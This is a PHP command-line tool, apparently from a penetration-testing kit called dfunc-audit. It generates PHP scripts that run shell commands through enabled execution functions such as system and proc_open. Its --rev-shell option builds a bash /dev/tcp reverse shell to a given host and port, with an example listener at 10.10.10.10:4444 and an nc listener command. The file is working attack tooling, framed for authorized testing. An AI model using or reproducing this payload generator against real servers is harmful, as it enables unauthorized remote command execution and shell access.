#!/usr/bin/env php
<?php

$known_long_opts = ["function", "command", "rev-shell", "host", "port", "output", "help"];
$longopts = ["function:", "command:", "rev-shell", "host:", "port:", "output:", "help"];
$options = getopt("h", $longopts);

// getopt() silently drops unrecognized long options instead of erroring,
// which just looks like the tool produced no output. Catch typos here.
foreach ($argv as $arg) {
    if (substr($arg, 0, 2) === "--") {
        $name = substr($arg, 2, strcspn($arg, "=", 2));
        if (!in_array($name, $known_long_opts, true)) {
            fwrite(STDERR, "Unknown option: --$name\n");
            fwrite(STDERR, "Known options: --" . implode(", --", $known_long_opts) . "\n\n");
            exit(1);
        }
    }
}

$supported_functions = ["system", "exec", "shell_exec", "passthru", "popen", "proc_open", "pcntl_exec"];

function print_help($supported_functions) {
    echo "Usage: php execution-checker.php --function NAME [--command CMD | --rev-shell\n";
    echo "                                  --host HOST --port PORT] --output OUTPUT_FILE\n\n";
    echo "Generates a small, self-contained PHP script that runs one command through\n";
    echo "one specific PHP function you've already confirmed is enabled (e.g. via\n";
    echo "dfunc-audit.php --gen-checker --enabled-only), to confirm that command\n";
    echo "execution actually works through it on a server you are authorized to test.\n\n";
    echo "  --function NAME       The dangerous function you've confirmed is enabled, one\n";
    echo "                        of: " . implode(", ", $supported_functions) . ".\n";
    echo "  --command CMD         The shell command to run through that function. Defaults\n";
    echo "                        to 'id', a harmless default test case. Ignored if\n";
    echo "                        --rev-shell is given.\n";
    echo "  --rev-shell           Generate a reverse shell payload (bash -i >&\n";
    echo "                        /dev/tcp/HOST/PORT 0>&1) instead of running --command.\n";
    echo "                        Requires --host and --port.\n";
    echo "  --host HOST           Listener host/IP to connect back to. Required with\n";
    echo "                        --rev-shell.\n";
    echo "  --port PORT           Listener port to connect back to. Required with\n";
    echo "                        --rev-shell.\n";
    echo "  --output OUTPUT_FILE  Where to write the generated PHP script.\n";
    echo "  -h, --help            show this help message and exit\n\n";
    echo "examples:\n";
    echo "  Confirm system() executes commands (uses the default 'id' test):\n";
    echo "    php execution-checker.php --function system --output check.php\n\n";
    echo "  Try a different enabled function and command:\n";
    echo "    php execution-checker.php --function shell_exec --command whoami --output check.php\n\n";
    echo "  Generate a reverse shell payload through proc_open:\n";
    echo "    php execution-checker.php --function proc_open --rev-shell --host 10.10.10.10 --port 4444 --output check.php\n\n";
    echo "  Then on the server:\n";
    echo "    php check.php\n";
}

if (isset($options['h']) || isset($options['help'])) {
    print_help($supported_functions);
    exit();
}

if (!isset($options['function']) || !isset($options['output'])) {
    fwrite(STDERR, "Error: --function and --output are required.\n\n");
    print_help($supported_functions);
    exit(1);
}

$function = $options['function'];
$output_path = $options['output'];
$rev_shell = isset($options['rev-shell']);

if ($rev_shell) {
    if (!isset($options['host']) || !isset($options['port'])) {
        fwrite(STDERR, "Error: --rev-shell requires --host and --port.\n\n");
        print_help($supported_functions);
        exit(1);
    }
    $command = "bash -c 'bash -i >& /dev/tcp/{$options['host']}/{$options['port']} 0>&1'";
} else {
    $command = isset($options['command']) ? $options['command'] : 'id';
}

if (!in_array($function, $supported_functions, true)) {
    fwrite(STDERR, "Error: unsupported function '$function'.\n");
    fwrite(STDERR, "Supported functions: " . implode(", ", $supported_functions) . "\n");
    exit(1);
}

function php_string_literal($s) {
    return "'" . str_replace(["\\", "'"], ["\\\\", "\\'"], $s) . "'";
}

$cmd_php = php_string_literal($command);

switch ($function) {
    case "system":
        $call = "system(\$command);";
        break;
    case "exec":
        $call = "exec(\$command, \$output);\necho implode(\"\\n\", \$output) . \"\\n\";";
        break;
    case "shell_exec":
        $call = "echo shell_exec(\$command);";
        break;
    case "passthru":
        $call = "passthru(\$command);";
        break;
    case "popen":
        $call = "\$fp = popen(\$command, \"r\");\n" .
                "if (\$fp) {\n" .
                "    while (!feof(\$fp)) {\n" .
                "        echo fread(\$fp, 4096);\n" .
                "    }\n" .
                "    pclose(\$fp);\n" .
                "}";
        break;
    case "proc_open":
        $call = "\$descriptorspec = array(1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\"));\n" .
                "\$proc = proc_open(\$command, \$descriptorspec, \$pipes);\n" .
                "if (is_resource(\$proc)) {\n" .
                "    echo stream_get_contents(\$pipes[1]);\n" .
                "    fclose(\$pipes[1]);\n" .
                "    fclose(\$pipes[2]);\n" .
                "    proc_close(\$proc);\n" .
                "}";
        break;
    case "pcntl_exec":
        // pcntl_exec replaces the current process image rather than returning
        // output, so run the command through /bin/sh -c like the others,
        // instead of taking a binary path + argv directly.
        $call = "pcntl_exec('/bin/sh', ['-c', \$command]);";
        break;
}

$script = "<?php\n";
$script .= "// Command-execution checker generated by dfunc-audit.\n";
$script .= "// Confirms that {$function}() can actually run a command on this server.\n";
$script .= "// Only run this on systems you are authorized to test.\n\n";
$script .= "\$command = $cmd_php;\n\n";
$script .= $call . "\n";

file_put_contents($output_path, $script);

echo "\nWrote a {$function}() command-execution check to $output_path\n";
echo "Run it on the server with: php $output_path\n";
if ($rev_shell) {
    echo "Start a listener first: nc -lvnp {$options['port']}\n";
}
